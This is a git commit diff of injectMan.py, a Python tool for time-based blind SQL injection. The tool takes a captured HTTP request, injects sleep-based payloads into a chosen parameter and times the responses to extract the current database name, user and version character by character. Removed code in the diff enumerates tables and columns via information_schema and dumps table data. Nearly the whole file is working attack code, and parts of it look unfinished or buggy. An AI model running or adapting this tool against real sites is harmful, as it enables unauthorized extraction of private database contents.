327f824b5e0ab34a637d55d55e3e78fa37077efb
nancheal <nancheal@126.com>
2017-09-24 16:54:24 +0800

    0.1

--- injectMan.py
+++ injectMan.py
@@ -1,143 +1,122 @@
 #coding:utf-8
 """
-Inject-man a TimeBlind inject pragaram which easy-code for customizable by nancheal
+injectMan a TimeBlind inject pragaram which easy-code for customizable and visable by nancheal
 Rely on:
     lib - docopt
-        - request
+        - requests
 Usage:
-    inject-man.py -f <file>
-    inject-man.py -h
-    inject-man.py -D
-    inject-man.py -T
-    inject-man.py -C
-    inject-man.py --db
-    inject-man.py --dbs
-    inject-man.py --table
-    inject-man.py -column
-    inject-man.py --dump
+    inject-man.py -r <file> -p  <param> -fix <prefix>,<suffix>
 Options:
-    -f          Read a data packet capture by burpsuite or other tools
-    -h          show help message
-    -D          specify a database
-    -T          specify a table
-    -C          specify a column
-    --db        show current db
-    --dbs       show all of dbs
-    --table     show all of table
-    --column    show all of column
-    --dump      show data
+    -f          Read a http data packet file
+    -p          Specify a param which is vulnerable
+todo:
 """
+import re
+import sys
+import pdb
 import docopt
+import logging
+from logging.handlers import TimedRotatingFileHandler
 import requests
 import datetime
-from BaseHTTPServer import BaseHTTPRequestHandler
+from urllib import quote
 from StringIO import StringIO
-#from urllib import quote
-class Judge:
+from BaseHTTPServer import BaseHTTPRequestHandler
+class File:
     """
-    Class Judge
-    Judge a param is injectable or not
-    Base on Time-blind technique
-    Use "AND" logic rather than "OR" logic for "AND" has a shorter time dely
-    Params:
-        type : Use FILE or URL
-        target : A file name or a website URI
-    Algorithm:
-        if responseTime(with payload) - responseTime(without payload) > sleepTime
-            it's injectable
-        else
-            it's not injectable
-        prefix_payload specify the prefix to close code
-        payload specify the exploite payload
-        suffix_payload specify the suffix to close code
+    File operation class
     """
-    def __init__(self, type, target):
-        self.prefix_payload = ['',' ','\' ','\" ','\') ','\") ',') ','%\'']
-        self.payload = 'and sleep(1) and'
-        self.suffix_payload = [' \'%\'=\'']
-        self.type = type
-        self.target = target
-    def is_injectable(self):
-        for i in self.prefix_payload:
-            for j in self.suffix_payload:
-                payload = i + self.payload + j
-                request = Request(self.target)
-                start_time = datetime.datetime.now()
-                if self.type == 'FILE':
-                    bodyList = request.processFile(self.target)
-                    for body in bodyList:
-                        data = body.format(payload)
-                        post = self.dataFormat(data)
-                        request.run(self.type,post)
-                elif self.type == 'URL':
-                    request.processUrl()
-                end_time = datetime.datetime.now()
-                print (end_time - start_time).seconds
-                if 'tmp1' in dir():
-                    tmp2 = (end_time - start_time).seconds
-                else:
-                    tmp1 = (end_time - start_time).seconds
-                if 'tmp2' in dir():
-                    if abs(tmp2 - tmp1) > 1:
-                        return tmp1,i
-        return 0
-    def dataFormat(self,str):
-        paramList = str.split(',')
-        result = {}
-        for i in paramList:
-            tmp = i.split(':')
-            result.setdefault(tmp[0],tmp[1])
-        return result
+    def __init__(self):
+        pass
+    def readFile(self,fileName):
+        with open(fileName,"r") as f:
+            fileData = f.read()
+            HTTPData = HTTPRequest(fileData)
+        return HTTPData
+class Payload:
+    """
+    Generate payload by input flag
+    """
+    def reduceTimes(self,symbol,value,pos=None):
+        if not pos:
+            pass
+    def withoutQuoteandequal(self,symbol,value,pos=None):
+        if not pos:
+            key = 'length(@@version){}{} and sleep(1)'
+            test_Payload = key.format(symbol,value)
+        else:
+            key = 'ascii(substring(@@version from {} for 1)){}{} and sleep(1)'
+            test_Payload = key.format(pos,symbol,value)
+        return test_Payload
+    def currentDb(self,symbol,value,pos=None):
+        if not pos:
+            key = 'length((select database()))'
+        else:
+            key = 'ascii(substr((select database()),{},1))'.format(pos)
+        currentDb_Payload = self.basic(key,symbol,value)
+        return currentDb_Payload
+    def currentUser(self,symbol,value,pos=None):
+        if not pos:
+            key = 'length((select user()))'
+        else:
+            key = 'ascii(substr((select user()),{},1))'.format(pos)
+        currentUser_Payload = self.basic(key,symbol,value)
+        return currentUser_Payload
+    def basic(self,key,symbol,value):
+        basicpayload = "if({}{}{},sleep(0.1),0)"
+        finalPayload = basicpayload.format(key,symbol,value)  
+        return finalPayload     
+class Join:
+    """
+    Join post data
+    """
+    def __init__(self,httpData):
+        if httpData.command == "POST":
+            self.data = httpData.rfile.read()
+        elif httpData.command == "GET":
+            self.data = httpData.path.split('?')[1]
+    def joinData(self,infDict):
+        """
+        infDict should contain 'param', 'prefix', 'payload', 'suffix'
+        """
+        fullpayload = "{}{}{}".format(infDict['prefix'],infDict['payload'],infDict['suffix'])
+        holderdata = self.addHolder(self.data,infDict['param'])
+        resultData = holderdata.format(quote(fullpayload))
+        return resultData
+    def addHolder(self,data,param):
+        addand = "{}&".format(data)
+        compiler = re.compile(r'%s=.*?\&'%param)
+        iteresult = compiler.finditer(addand)
+        for i in iteresult:
+            matchstr = i.group()
+        fixpos = data.find(matchstr) + len(matchstr) - 1
+        fixData = "{}{{}}&{}".format(addand[:fixpos],addand[fixpos+1:-1])
+        return fixData
 class Request:
     """
-    Class Request
-    support two type:FILE,URL
-    Support two method:GET,POST 
+    Request class 
     """
-    def __init__(self, target):
-        self.target = target
-    def run(self, type, body):
-        if type == 'FILE':
-            #file = self.target
-            #bodyList = self.processFile(file)
-            #for i in bodyList:
-            req = requests.post(self.url, data=body, headers=self.headers)
-            #print req.text
-        elif type == 'URL':
-            self.processUrl()
-    def processFile(self,file):
-        with open(file) as f:
-            text = f.read()
-            request = HTTPRequst(text)
-            self.body = []
-            if request.command == "POST":
-                self.url = "http://{}{}".format(request.headers['Host'],request.path)
-                self.headers = request.headers
-                self.data = request.rfile.read() + '&'
-                posList = self.findPos(self.data,'&')
-                for i in posList:
-                    bodyCode = self.data[0:i] + '{}' + '&' +self.data[i+1:]
-                    body = bodyCode[:-1].replace('&',',').replace('=',':')
-                    self.body.append(body)
-                return self.body
-            elif request.command == "GET":
-                pass
-    def findPos(self,str,sub):
-        """
-        FindPos function which find all sub's Position in str
-        """
-        pos = 0
-        pos_list = []
-        while True:
-            pos = str.find(sub,pos)
-            if pos<0:
-                break
-            pos_list.append(pos)
-            pos += 1
-        return pos_list   
-    def processUrl(self):
-        pass
-class HTTPRequst(BaseHTTPRequestHandler):
+    def __init__(self,httpData):
+        self.url = "http://{}{}".format(httpData.headers["host"],httpData.path)
+        self.header = httpData.headers
+        self.method = httpData.command
+    def send(self,Data = None):
+        if self.method == "POST":
+            self.post(Data)
+        elif self.method == "GET":
+            self.get(Data)
+    def post(self,data):
+        try:
+            requesthandler = requests.post(self.url,data=data,headers=self.header) 
+        except BaseException as e:
+            print e
+    def get(self,data):
+        try:
+            getUrl = self.url.split('?')[0]
+            req = requests.get(getUrl,headers=self.header,params=data)
+        except BaseException as e:
+            print e      
+class HTTPRequest(BaseHTTPRequestHandler):
     """
     HTTPRequest Prase class
     """
@@ -149,68 +128,139 @@ class HTTPRequst(BaseHTTPRequestHandler):
     def send_error(self,code,message):
         self.error_code = code
         self.error_message = message
-#这里考虑到sleep的特性，如果采用手工注入的二分思维，可能会sleep多次，从而导致盲注时间过长
-#所以我选择遍历的方法，虽然会进行多次的循环，但是只会有一次sleep，总的来说时间还是比较少的
-#prefix 注入判断是确定的闭合符 ，normal_time 正常请求的响应时间
-def brute(prefix,normal_time):
-	#result = {}
-	#DB_name = getcurrentDB(prefix,normal_time)
-	#table = getTable(prefix,normal_time,DB_name)
-	#result.setdefault(DB_name,table)
-	#print result
-	print dump(prefix,normal_time,'emails','id')
-def getcurrentDB(prefix,normal_time):
-	DB_length = getLength(prefix,normal_time,'length((select database()))',20)
-	DB_name = getName(prefix,normal_time,'(select database())',DB_length+1)
-	return DB_name
-def getTable(prefix,normal_time,DB_name):
-	result = {}
-	table_count = getLength(prefix,normal_time,'(select count(table_name) from information_schema.tables where table_schema = \'%s\')'%(DB_name),20)
-	for i in range(0,table_count): 
-		table_length = getLength(prefix,normal_time,'(select length(table_name) from information_schema.tables where table_schema = \'%s\' limit %d,1)'%(DB_name,i),20)
-		table_name = getName(prefix,normal_time,'(select table_name from information_schema.tables where table_schema = \'%s\' limit %d,1)'%(DB_name,i),table_length+1)
-		result.setdefault(table_name,[])
-	return result
-def getColumn(prefix,normal_time,DB_name,table_name):
-	result = []
-	column_count = getLength(prefix,normal_time,'(select count(column_name) from information_schema.columns where table_schema = \'%s\' and table_name = \'%s\')'%(DB_name,table_name),20)
-	for i in range(0,column_count): 
-		column_length = getLength(prefix,normal_time,'(select length(column_name) from information_schema.columns where table_schema = \'%s\' and table_name = \'%s\' limit %d,1)'%(DB_name,table_name,i),20)
-		column_name = getName(prefix,normal_time,'(select column_name from information_schema.columns where table_schema = \'%s\' and table_name = \'%s\' limit %d,1)'%(DB_name,table_name,i),column_length+1)
-		result.append(column_name)
-	return result
-def dump(prefix,normal_time,table_name,column_name):
-	result = []
-	data_num = getLength(prefix,normal_time,'(select count(%s) from %s)'%(column_name,table_name),20)
-	for i in range(0,data_num):
-		data_length = getLength(prefix,normal_time,'(select length(%s) from %s limit %d,1)'%(column_name,table_name,i),20)
-		data = getName(prefix,normal_time,'(select %s from %s limit %d,1)'%(column_name,table_name,i),data_length+1)
-		result.append(data)
-	return result
-def getLength(prefix,normal_time,payload,leng):
-	for i in range(1,leng):
-		url = target + prefix + 'and if(%s = %d,sleep(1),0) --+' % (payload,i)
-		start_time = datetime.datetime.now()
-		urllib.urlopen(url)
-		end_time = datetime.datetime.now()
-		if (end_time - start_time).seconds - normal_time >= 1:
-			return i
-def getName(prefix,normal_time,payload,leng):
-	name = ''
-	for i in range(leng):
-		for j in range(32,127):
-			url = target + prefix + 'and if(ascii(substr(%s,%d,1))=%d,sleep(1),0) --+' % (payload,i,j)
-			start_time = datetime.datetime.now()
-			urllib.urlopen(url)
-			end_time = datetime.datetime.now()
-			if (end_time - start_time).seconds - normal_time >= 1:
-				name += chr(j)
-	return name
-if __name__ == '__main__':
-    Arguments = docopt.docopt(__doc__)
-    if Arguments['-f']:
-        demo = Judge('FILE',Arguments['<file>'])
-        demo.is_injectable()
-    elif Arguments['-u']:
-        getRequest = Judge('URL',Arguments['<url>'])
-        demo.is_injectable()
+class ConsoleHandler(logging.StreamHandler):
+    on_same_line = False
+    def emit(self, record):
+        try:
+            msg = self.format(record)
+            stream = self.stream
+            same_line = getattr(record, 'same_line')
+            if self.on_same_line and not same_line:
+                stream.write('\n')
+            stream.write(msg)
+            if same_line:
+                stream.write('\r')
+                self.on_same_line = True
+            else:
+                stream.write('\n')
+                self.on_same_line = False
+            self.flush()
+        except (KeyboardInterrupt, SystemExit):
+            raise
+        except:
+            self.handleError(record)
+class Mylog:
+    RESULT = '\033[92m'                                                       
+    INFO = '\033[94m'                                                        
+    ENDC = '\033[0m'    
+    def __init__(self):
+        self.resultLevel = 100
+        logging.addLevelName(self.resultLevel,"RESULT")
+        self.logger = logging.getLogger("injectManlog")
+        self.logger.setLevel(logging.INFO)
+    def toLog(self, level, message, option):
+        basicFmt = self.switchColor(level,"[%(asctime)s] [%(levelname)s] %(message)s")
+        timeFmt = "%H:%M:%S"
+        formatter = logging.Formatter(fmt = basicFmt,datefmt = timeFmt)
+        consoleHandler = ConsoleHandler()
+        consoleHandler.setFormatter(formatter)
+        self.logger.addHandler(consoleHandler)
+        intLevel = self.switchIntLevel(level)
+        self.logger.log(intLevel,message + self.ENDC,extra=option)
+    def switchColor(self, level, message):
+        switcher={
+            "result":self.RESULT,
+            "info":self.INFO,
+        }
+        #pdb.set_trace()
+        return switcher.get(level) + message
+    def switchIntLevel(self,level):
+        switcher={
+            "result":100,
+            "critical":50,
+            "error":40,
+            "warning":30,
+            "info":20,
+            "debug":10,
+            "notset":0
+        }
+        return switcher.get(level)
+class Inject:
+    """
+    Inject main code
+    """
+    def __init__(self,fileName):
+        self.nFile = File()
+        self.rFile = self.nFile.readFile(fileName)
+        self.nJoin = Join(self.rFile)
+        self.nRequest = Request(self.rFile)
+        self.log = Mylog()
+    def inJect(self,infDict,optionDict):
+        Func = self.chooseMode(optionDict)
+        lengthPoc = None
+        length = self.binarySearch(infDict,Func,lengthPoc)
+        self.log.toLog("result","Current length is {}".format(length),option={'same_line':False})
+        name = ''
+        for namePos in range(1,length+1):
+            charAscii = self.binarySearch(infDict,Func,namePos)
+            name = name + chr(charAscii)
+            self.log.toLog("result","Current name is {}".format(name),option={'same_line':True})
+        sys.stderr.write('\n')
+    def binarySearch(self,infDict,Func,pos):
+        self.left = 0
+        self.right = 127
+        nPayload = Payload()
+        self.symbol = ">"
+        while self.left <= self.right:
+            self.mid = int((self.left+self.right)/2)
+            infDict['payload'] = getattr(nPayload,Func)(self.symbol,self.mid,pos)       
+            data = self.nJoin.joinData(infDict)
+            startTime = datetime.datetime.now()
+            self.nRequest.send(data)
+            endTime = datetime.datetime.now()
+            timeTmp = (endTime - startTime).seconds
+            judgeResult = self.binaryJudge(timeTmp,1)
+            if judgeResult:
+                return self.mid
+    def burteSearch(self,infDict,Func,pos):
+        self.symbol = "="
+        nPayload = Payload()
+        for i in range(1,127):
+            infDict['payload'] = getattr(nPayload,Func)(self.symbol,i,pos)       
+            data = self.nJoin.joinData(infDict)
+            startTime = datetime.datetime.now()
+            self.nRequest.send(data)
+            endTime = datetime.datetime.now()
+            timeTmp = (endTime - startTime).seconds
+            if timeTmp >= 1:
+                return i
+    def binaryJudge(self,timeTmp,stander):
+        if timeTmp >= stander and self.symbol == "=":
+            return 1
+        elif timeTmp >= stander and self.symbol == ">":
+            self.left = self.mid - 1
+        elif timeTmp >= stander and self.symbol == "<":
+            self.right = self.mid + 1
+        elif timeTmp < stander and self.symbol == ">":
+            self.symbol = "="
+        elif timeTmp < stander and self.symbol == "=":
+            self.symbol = "<"
+        elif timeTmp < stander and self.symbol == "<":
+            self.symbol = ">"
+        return 0
+    def chooseMode(self,infDict):
+        if '--current-db' in infDict.keys():
+            Func = "currentDb"
+        if '--current-user' in infDict.keys():
+            Func = "currentUser"
+        if '--withoutQuoteandequal' in infDict.keys():
+            Func = 'withoutQuoteandequal'
+        if '--reduceTimes' in infDict.keys():
+            Func = 'reduceTimes'
+        return Func
+if __name__ == "__main__":
+    nInject = Inject('1.txt')
+    nInject.inJect({'param':'uname','prefix':'\' or ','suffix':' #'},{'--current-db':True})
+    #nInject.inJect({'param':'roleId','prefix':'\' or ','suffix':' %23'},{'--current-db':True})
+    #nInject.inJect({'param':'uname','prefix':'\' or ','suffix':' %23'},{'--current-db':False,'--current-user':True})
+    #nInject.inJect({'param':'certificateId','prefix':'\' or ','suffix':' and \'1\'=\'1'},{'--current-db':False,'--current-user':True,'--withoutQuoteandequal':False,'--reduceTimes':False})
